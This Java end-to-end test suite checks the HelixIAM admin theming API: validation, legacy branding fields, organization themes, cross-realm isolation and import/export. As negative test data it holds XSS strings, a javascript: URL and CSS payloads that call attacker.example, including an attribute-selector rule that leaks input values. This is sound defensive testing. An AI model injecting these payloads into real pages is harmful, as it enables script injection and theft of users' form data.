/*
 * Copyright 2026 HelixIAM contributors
 * SPDX-License-Identifier: Apache-2.0
 */

package io.helixiam.e2e;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Structured theming, admin API (spec §7): {@code GET/PUT /admin/realms/{r}/theme} and
 * {@code .../organizations/{orgId}/theme} with field-level validation, the deprecated realm-settings branding fields
 * mapped onto the theme, the 1.0 organization-branding API as a view onto the organization theme, the rc.4
 * cross-realm rules, and realm import/export carrying the theme (with the same validation on import).
 */
class ThemeAdminE2eTest extends AbstractE2eTest {

    private static final ObjectMapper JSON = new ObjectMapper();

    private String realm;
    private E2eAdminSession admin;

    @BeforeEach
    void setUp() {
        realm = E2eSeed.unique("firm");
        seed().realm(realm, "Monthfold");
        admin = adminSession(realm);
    }

    private String themePath(final String r) {
        return "/admin/realms/" + r + "/theme";
    }

    private static Map<String, Object> monthfold() {
        return Map.of(
                "colors", Map.of(
                        "primary", Map.of("light", "#1F4D47", "dark", "#7fb8ac"),
                        "surface", Map.of("light", "#f7f8f6", "dark", "#111615"),
                        "surfaceRaised", Map.of("light", "#ffffff", "dark", "#192120"),
                        "ink", Map.of("light", "#16211f", "dark", "#e8eeec"),
                        "negative", Map.of("light", "#b3401b")),
                "typography", Map.of("fontSans", "system-sans", "fontDisplay", "system-serif", "baseSize", 16),
                "shape", Map.of("radius", 6, "density", "comfortable"),
                "assets", Map.of("logoUrl", "https://cdn.monthfold.example/logo.svg"),
                "layout", Map.of("layout", "split", "showLanguageSwitcher", false, "supportedLocales", List.of("en")),
                "texts", Map.of("brandHeadline", Map.of("en", "Monthly reports your clients will actually read."),
                        "brandByline", "", "brandBadges", List.of()),
                "links", Map.of("privacyUrl", "https://monthfold.example/privacy"));
    }

    @Test
    void aRealmThemeRoundTrips_andTheEffectiveThemeDerivesDarkValues() {
        final E2eHttp.Response put = admin.put(themePath(realm), monthfold());
        assertThat(put.status()).as(put.toString()).isEqualTo(200);
        assertThat(put.json().path("colors").path("primary").path("light").asText()).isEqualTo("#1F4D47");

        final JsonNode stored = admin.get(themePath(realm)).json();
        assertThat(stored.path("shape").path("radius").asInt()).isEqualTo(6);
        assertThat(stored.path("texts").path("brandByline").path("default").asText()).isEmpty();
        assertThat(stored.path("colors").has("border")).as("only what was set is stored").isFalse();
        assertThat(stored.has("notices")).isFalse();

        final JsonNode effective = admin.get(themePath(realm) + "?effective=true").json();
        assertThat(effective.path("colors").path("negative").path("dark").asText()).matches("#[0-9a-f]{6}");
        assertThat(effective.path("colors").path("border").path("light").asText()).matches("#[0-9a-f]{6}");
        assertThat(effective.path("version").asText()).hasSize(64);

        // Custom CSS is accepted as the restricted escape hatch, with a notice.
        final Map<String, Object> withCss = new java.util.HashMap<>(monthfold());
        withCss.put("customCss", ".helix-form h1 { letter-spacing: -0.01em }");
        final E2eHttp.Response css = admin.put(themePath(realm), withCss);
        assertThat(css.status()).isEqualTo(200);
        assertThat(css.json().path("notices").get(0).asText()).contains("internal page markup");
        assertThat(admin.get(themePath(realm) + "?effective=true").json().path("version").asText())
                .as("the version changes with the theme").isNotEqualTo(effective.path("version").asText());
    }

    @Test
    void invalidThemes_areRefusedWithFieldErrors_andNothingIsStored() {
        assertThat(admin.put(themePath(realm), monthfold()).status()).isEqualTo(200);
        final Map<String, Object> bad = Map.of(
                "colors", Map.of("primary", Map.of("light", "red"), "ink", Map.of("light", "#aaaaaa")),
                "assets", Map.of("logoUrl", "http://cdn.example/logo.png"),
                "typography", Map.of("baseSize", 30),
                "texts", Map.of("welcomeText", "<script>alert(1)</script>"),
                "customCss", "</style><script>alert(1)</script>");
        final E2eHttp.Response r = admin.put(themePath(realm), bad);
        assertThat(r.status()).as(r.toString()).isEqualTo(400);
        final JsonNode errors = r.json().path("fieldErrors");
        assertThat(errors.has("colors.primary.light")).as(r.toString()).isTrue();
        assertThat(errors.has("assets.logoUrl")).isTrue();
        assertThat(errors.has("typography.baseSize")).isTrue();
        assertThat(errors.has("texts.welcomeText")).isTrue();
        assertThat(errors.path("customCss").asText()).contains("<");
        assertThat(r.json().path("message").asText()).isNotBlank();

        final E2eHttp.Response contrast = admin.put(themePath(realm), Map.of("colors",
                Map.of("ink", Map.of("light", "#aaaaaa"))));
        assertThat(contrast.status()).isEqualTo(400);
        assertThat(contrast.json().path("fieldErrors").path("contrast.inkOnSurface.light").asText())
                .contains("Ink on surface").contains("4.5:1");

        final E2eHttp.Response malformed = admin.put(themePath(realm), Map.of("colors", Map.of("primary", "red")));
        assertThat(malformed.status()).isEqualTo(400);

        assertThat(admin.get(themePath(realm)).json().path("colors").path("primary").path("light").asText())
                .as("unchanged").isEqualTo("#1F4D47");
    }

    @Test
    void theDeprecatedRealmSettingsBrandingFields_mapOntoTheTheme() {
        assertThat(admin.put(themePath(realm), monthfold()).status()).isEqualTo(200);
        final String settingsPath = "/admin/realms/" + realm + "/settings";
        final JsonNode settings = admin.get(settingsPath).json();
        assertThat(settings.path("primaryColor").asText()).isEqualTo("#1F4D47");
        assertThat(settings.path("backgroundColor").asText()).isEqualTo("#f7f8f6");
        assertThat(settings.path("logoUrl").asText()).isEqualTo("https://cdn.monthfold.example/logo.svg");

        // An unrelated settings save (the console sends every field back) leaves the theme untouched.
        final ObjectNode same = settings.deepCopy();
        same.put("requireMfa", false);
        assertThat(admin.put(settingsPath, same).status()).isEqualTo(200);
        assertThat(admin.get(themePath(realm)).json().path("shape").path("radius").asInt()).isEqualTo(6);

        final ObjectNode legacy = settings.deepCopy();
        legacy.put("primaryColor", "#173b36");
        legacy.put("welcomeText", "Welcome back");
        final E2eHttp.Response saved = admin.put(settingsPath, legacy);
        assertThat(saved.status()).as(saved.toString()).isEqualTo(200);
        final JsonNode theme = admin.get(themePath(realm)).json();
        assertThat(theme.path("colors").path("primary").path("light").asText()).isEqualTo("#173b36");
        assertThat(theme.path("colors").path("primary").has("dark")).as("a new light value gets a derived dark").isFalse();
        assertThat(theme.path("texts").path("welcomeText").path("default").asText()).isEqualTo("Welcome back");
        assertThat(theme.path("typography").path("fontDisplay").asText()).as("the rest is kept").isEqualTo("system-serif");

        final ObjectNode evil = settings.deepCopy();
        evil.put("customCss", "input[value^=a] { background-image: url(https://attacker.example/a) }");
        final E2eHttp.Response refused = admin.put(settingsPath, evil);
        assertThat(refused.status()).as(refused.toString()).isEqualTo(400);
        assertThat(refused.json().path("fieldErrors").path("customCss").asText()).contains("url(");
        assertThat(admin.get(themePath(realm)).json().has("customCss")).isFalse();
    }

    @Test
    void organizationThemes_andTheBrandingApiShareOneLayer() {
        final String orgId = admin.post("/admin/realms/" + realm + "/organizations", Map.of("name", E2eSeed.unique("harbor")))
                .json().path("orgId").asText();
        final String orgTheme = "/admin/realms/" + realm + "/organizations/" + orgId + "/theme";
        assertThat(admin.get(orgTheme).json().toString()).isEqualTo("{}");

        final E2eHttp.Response put = admin.put(orgTheme, Map.of("colors", Map.of("primary", Map.of("light", "#6d28d9")),
                "assets", Map.of("faviconUrl", "https://cdn.harbor.example/fav.png")));
        assertThat(put.status()).as(put.toString()).isEqualTo(200);
        assertThat(admin.put(orgTheme, Map.of("customCss", ".a{}")).json().path("fieldErrors").has("customCss")).isTrue();

        final String branding = "/admin/realms/" + realm + "/organizations/" + orgId + "/branding";
        assertThat(admin.get(branding).json().path("primaryColor").asText()).isEqualTo("#6d28d9");
        assertThat(admin.put(branding, Map.of("displayName", "Harbor & Pine", "logoUrl", "https://cdn.harbor.example/l.svg",
                "primaryColor", "#1F6F5C")).status()).isEqualTo(200);
        final JsonNode theme = admin.get(orgTheme).json();
        assertThat(theme.path("assets").path("logoUrl").asText()).isEqualTo("https://cdn.harbor.example/l.svg");
        assertThat(theme.path("assets").path("faviconUrl").asText()).as("kept").isEqualTo("https://cdn.harbor.example/fav.png");
        assertThat(theme.path("colors").path("primary").path("light").asText()).isEqualTo("#1F6F5C");

        final E2eHttp.Response lowContrast = admin.put(branding, Map.of("primaryColor", "#ffe14d"));
        assertThat(lowContrast.status()).isEqualTo(400);
        assertThat(lowContrast.json().path("fieldErrors").has("primaryColor")).as(lowContrast.toString()).isTrue();

        final JsonNode effective = admin.get(orgTheme + "?effective=true").json();
        assertThat(effective.path("colors").path("primary").path("light").asText()).isEqualTo("#1F6F5C");
        assertThat(effective.path("colors").path("surface").path("light").asText()).as("from the realm/default").isNotBlank();
    }

    @Test
    void themesCannotBeReadOrChangedAcrossRealms() {
        final String other = E2eSeed.unique("rival");
        seed().realm(other);
        final E2eAdminSession master = adminSession();
        final String orgB = master.post("/admin/realms/" + other + "/organizations", Map.of("name", E2eSeed.unique("org")))
                .json().path("orgId").asText();
        assertThat(master.put("/admin/realms/" + other + "/organizations/" + orgB + "/theme",
                Map.of("assets", Map.of("logoUrl", "https://b.example/logo.svg"))).status()).isEqualTo(200);
        assertThat(master.put(themePath(other), Map.of("assets", Map.of("logoUrl", "https://b.example/realm.svg")))
                .status()).isEqualTo(200);

        // By id through the admin's own realm: the organization does not exist there.
        final String viaOwnRealm = "/admin/realms/" + realm + "/organizations/" + orgB + "/theme";
        assertThat(admin.get(viaOwnRealm).status()).isEqualTo(404);
        assertThat(admin.put(viaOwnRealm, Map.of("assets", Map.of("logoUrl", "https://attacker.example/l.svg"))).status())
                .isEqualTo(404);
        assertThat(admin.get("/admin/realms/" + realm + "/organizations/" + orgB + "/branding").status()).isEqualTo(404);
        // Directly on the other realm: not this admin's realm.
        assertThat(admin.get(themePath(other)).status()).isIn(403, 404);
        assertThat(admin.put(themePath(other), Map.of("customCss", ".a{}")).status()).isIn(403, 404);
        assertThat(admin.get("/admin/realms/" + other + "/organizations/" + orgB + "/theme").status()).isIn(403, 404);

        assertThat(master.get("/admin/realms/" + other + "/organizations/" + orgB + "/theme").json()
                .path("assets").path("logoUrl").asText()).isEqualTo("https://b.example/logo.svg");
        assertThat(master.get(themePath(other)).json().has("customCss")).isFalse();
        assertThat(master.get(themePath(E2eSeed.unique("no-such-realm"))).status()).isEqualTo(404);
    }

    @Test
    void exportCarriesTheTheme_andImportValidatesIt() throws Exception {
        final String orgName = E2eSeed.unique("harbor");
        final String orgId = admin.post("/admin/realms/" + realm + "/organizations", Map.of("name", orgName))
                .json().path("orgId").asText();
        assertThat(admin.put(themePath(realm), monthfold()).status()).isEqualTo(200);
        assertThat(admin.put("/admin/realms/" + realm + "/organizations/" + orgId + "/theme",
                Map.of("shape", Map.of("density", "compact"))).status()).isEqualTo(200);

        final JsonNode export = admin.get("/admin/realms/" + realm + "/export").json();
        assertThat(export.path("theme").path("shape").path("radius").asInt()).isEqualTo(6);
        assertThat(export.path("organizationThemes").get(0).path("organization").asText()).isEqualTo(orgName);

        // Into a fresh realm: the theme and the organization theme come along.
        final String target = E2eSeed.unique("copy");
        seed().realm(target);
        final E2eAdminSession master = adminSession();
        final E2eHttp.Response imported = master.post("/admin/realms/" + target + "/import", export);
        assertThat(imported.status()).as(imported.toString()).isEqualTo(200);
        assertThat(master.get(themePath(target)).json().path("shape").path("radius").asInt()).isEqualTo(6);
        final String copiedOrg = master.get("/admin/realms/" + target + "/organizations").json().findValues("orgId").stream()
                .map(JsonNode::asText).findFirst().orElseThrow();
        assertThat(master.get("/admin/realms/" + target + "/organizations/" + copiedOrg + "/theme").json()
                .path("shape").path("density").asText()).isEqualTo("compact");

        // A document with a malicious theme is refused for that slice; the stored theme is unchanged.
        final ObjectNode evil = JSON.createObjectNode();
        evil.put("formatVersion", 2);
        evil.set("theme", JSON.valueToTree(Map.of("customCss", "</style><script>alert(1)</script>",
                "assets", Map.of("logoUrl", "javascript:alert(1)"))));
        final E2eHttp.Response refused = master.post("/admin/realms/" + target + "/import", evil);
        assertThat(refused.status()).as(refused.toString()).isEqualTo(422);
        assertThat(refused.body()).contains("theme");
        assertThat(master.get(themePath(target)).json().has("customCss")).isFalse();

        // Old documents: legacy branding fields in the realm slice go through the same validation.
        final ObjectNode legacy = JSON.createObjectNode();
        legacy.put("formatVersion", 2);
        final ObjectNode realmSlice = ((ObjectNode) export.path("realm")).deepCopy();
        realmSlice.put("customCss", "@import url(https://attacker.example/x.css);");
        legacy.set("realm", realmSlice);
        final E2eHttp.Response legacyRefused = master.post("/admin/realms/" + target + "/import", legacy);
        assertThat(legacyRefused.status()).as(legacyRefused.toString()).isEqualTo(422);
        assertThat(master.get(themePath(target)).json().has("customCss")).isFalse();
    }

    @Test
    void theLegacyBrandingFields_areMarkedDeprecatedInTheApiDocs() {
        final E2eHttp.Response docs = adminSession().get("/v3/api-docs");
        assertThat(docs.status()).as(docs.toString()).isEqualTo(200);
        final JsonNode request = docs.json().path("components").path("schemas").path("RealmSettingsRequest").path("properties");
        for (final String field : List.of("logoUrl", "primaryColor", "backgroundColor", "welcomeText", "customCss")) {
            assertThat(request.path(field).path("deprecated").asBoolean()).as(field).isTrue();
        }
        assertThat(request.path("displayName").path("deprecated").asBoolean()).isFalse();
    }
}
